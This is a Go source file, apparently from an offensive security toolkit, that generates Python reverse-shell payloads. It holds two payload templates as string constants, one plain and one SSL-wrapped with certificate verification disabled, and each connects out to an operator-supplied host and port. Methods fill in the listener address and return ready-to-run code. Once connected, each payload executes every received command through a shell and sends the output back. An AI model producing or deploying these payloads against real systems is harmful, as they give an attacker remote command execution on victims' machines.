package reverse

import (
	"fmt"
)

const (
	PythonDefault = Python27
	Python27      = "import socket\n" +
		"import subprocess\n" +
		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
		"s.connect(('%s', %d))\n" +
		"while 1:\n" +
		"    data = s.recv(1024).decode('UTF-8')\n" +
		"    if data == 'exit\\n':\n" +
		"        break\n" +
		"    if len(data) > 0:\n" +
		"        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n" +
		"        s.send(proc.stdout.read() + proc.stderr.read())\n" +
		"s.close()\n"
	Python27Secure = "import socket\n" +
		"import subprocess\n" +
		"import ssl\n" +
		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
		"s.connect(('%s', %d))\n" +
		"sslsock = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)\n" +
		"while 1:\n" +
		"    data = sslsock.recv(1024).decode('UTF-8')\n" +
		"    if data == 'exit\\n':\n" +
		"        break\n" +
		"    if len(data) > 0:\n" +
		"        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n" +
		"        sslsock.send(proc.stdout.read() + proc.stderr.read())\n" +
		"sslsock.close()\n"
)

func (py *PythonPayload) Default(lhost string, lport int) string {
	return py.Python27(lhost, lport)
}

// An unflattened reverse shell that works on Python 2.7, 3+, Windows and Linux.
func (py *PythonPayload) Python27(lhost string, lport int) string {
	return fmt.Sprintf(PythonDefault, lhost, lport)
}

// An unflattened reverse shell that uses an SSL socket, works on Python 2.7, 3+, Windows and Linux.
func (py *PythonPayload) SecurePython27(lhost string, lport int) string {
	return fmt.Sprintf(Python27Secure, lhost, lport)
}
